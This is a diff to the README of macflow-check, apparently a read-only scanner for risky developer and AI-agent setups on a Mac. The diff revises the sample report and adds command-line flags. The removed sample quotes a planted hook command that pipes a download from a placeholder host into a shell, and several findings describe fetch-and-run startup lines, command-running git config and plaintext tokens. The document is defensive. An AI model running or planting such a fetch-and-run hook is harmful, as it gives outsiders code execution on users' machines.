@@ -12,48 +12,50 @@ It reads files and prints a report. It never changes a file, never runs a progra
 
 ## Sample output
 
-From a demo home folder with a few planted problems (paths shortened to `~`, some sections left out):
+From a demo home folder with a few planted problems. A real Homebrew PHP finding from the demo machine is left out.
 
 ```text
-[AI agent setup]
-  - Claude Code settings: Found 3 items:
-    - [HIGH] Remote code fetching in hook command
-      Location: ~/.claude/settings.json:2
-      Why: Hook command uses remote code fetching or decoding vector in event 'PostToolUse': 'curl -s https://telemetry.example/c | sh'
-      Fix: Remove remote download or decoding pipes from hook commands.
-    - [MEDIUM] Confirmation before bypass mode is turned off
-      Location: ~/.claude/settings.json:4
-  - MCP servers: Found 2 items:
-    - [MEDIUM] MCP server 'helper' runs unpinned package with npx -y: some-mcp-helper
-      Location: ~/projects/app/.mcp.json:1
-      Fix: Pin the package to an exact semver version (e.g. npx -y some-mcp-helper@<version>).
-  - VS Code tasks: Found 1 item:
-    - [HIGH] Automatic folderOpen task 'setup'
-      Location: ~/projects/app/.vscode/tasks.json:1
-  - Plaintext AI keys: Found 1 item:
-    - [HIGH] Plaintext OpenAI API key in OPENAI_API_KEY (sk-proj-...)
-      Location: ~/projects/app/.env:1
+macflow-check 0.1.1 · 0.4s · offline
 
-[Security]
-  - Git config that runs commands: Found 1 item:
-    - [HIGH] Git config: core.fsmonitor runs a command on every `git status`, including ones an AI agent runs
-      Location: ~/projects/app/.git/config:3
-      Why: ~/projects/app/.git/config line 3 sets core.fsmonitor. Values are not shown.
-  - Plaintext credentials: Found 1 item:
-    - [HIGH] npm token stored in plaintext in ~/.npmrc
-      Location: ~/.npmrc:1
-  - Shell startup files: Found 1 item:
-    - [HIGH] ~/.zshrc downloads a script and pipes it to a shell every time a shell starts
-      Location: ~/.zshrc:2
-  - Dependency vulnerabilities (OSV): [not checked] (module skipped: offline mode)
+6 to fix now · 2 worth fixing
 
-Summary
--------
-Total findings: 10
-  High:     6
-  Medium:   3
-  Info:     1
+FIX NOW
+ 1  Remote code fetching in hook command
+    → Remove remote download or decoding pipes from hook commands.
+    ~/.claude/settings.json:2
+ 2  Git config: core.fsmonitor runs a command on every `git status`, including ones an AI agent runs
+    → If you did not set this, remove it with `git -C ~/projects/app config --unset-all 'core.fsmonitor'` (or edit ~/projects/app/.git/config) and treat the repository as untrusted.
+    ~/projects/app/.git/config:3
+ 3  Plaintext OpenAI API key in OPENAI_API_KEY (sk-proj-...)
+    → Remove plaintext API key from file and load credentials dynamically via a secret manager or keychain.
+    ~/projects/app/.env:1
+ 4  npm token stored in plaintext in ~/.npmrc
+    → Remove the token from the file. Publish from CI with npm trusted publishing, or keep the token in Keychain and reference it as ${NPM_TOKEN}.
+    ~/.npmrc:1
+ 5  ~/.zshrc downloads a script and pipes it to a shell every time a shell starts
+    → If you did not add this line, delete it from ~/.zshrc, open a new terminal, and rotate tokens that were on this Mac.
+    ~/.zshrc:2
+ 6  Automatic folderOpen task 'setup'
+    → Remove "runOn": "folderOpen" from runOptions or disable automatic task execution (task.allowAutomaticTasks) in VS Code/Cursor.
+    ~/projects/app/.vscode/tasks.json:1
+
+WORTH FIXING
+ 7  Confirmation before bypass mode is turned off
+    → Remove skipDangerousModePermissionPrompt, or set permissions.disableBypassPermissionsMode to true if you never use bypass mode.
+    ~/.claude/settings.json:3
+ 8  MCP server 'helper' runs unpinned package with npx -y: some-mcp-helper
+    → Pin the package to an exact semver version (e.g. npx -y some-mcp-helper@<version>).
+    ~/projects/app/.mcp.json:1
+
+No known match in: Agent auto-approve settings, Developer caches, Editor extensions, Hidden text in agent rules files, Known malware files, Login items (LaunchAgents), SSH keys and config, Secrets in shell history, Stale node_modules
+Not checked: Claude Code plugins (~/.claude/plugins directory not present), Dependency vulnerabilities (OSV) (offline mode)
+Every finding: macflow-check --details · JSON: --json
+
+From MacFlow, the Mac app that snapshots your dev setup and shows what changed.
+Continuous watching for these checks (planned): macflow.ai/check
 ```
+
+The report leads with what to fix. Findings of the same kind are grouped into one numbered line; `macflow-check --show <N>` lists every finding in group N, and `--details` prints every check and finding. In a terminal, "fix now" is red and "worth fixing" is yellow. Colour is off when the output is piped, with `--no-color`, or when `NO_COLOR` is set.
 
 "No known match" means none of the checks below matched. It does not mean nothing is wrong.
 
@@ -122,7 +124,11 @@ cargo install --git https://github.com/mazharul/macflow-check
 ```text
 macflow-check [OPTIONS] [PATHS]...
 
+    --details        List every check and finding, not the short summary
+    --show <N>       Show every finding in group N of the summary
+                     (scans again: pass the same paths and --offline)
     --json           Output machine-readable JSON (schema v1)
+    --no-color       Plain text (also NO_COLOR=1; CLICOLOR_FORCE=1 forces colour)
     --offline        Skip network checks and run strictly offline
     --root <PATH>    Add a project root directory to scan (repeatable)
     -h, --help       Print this usage message
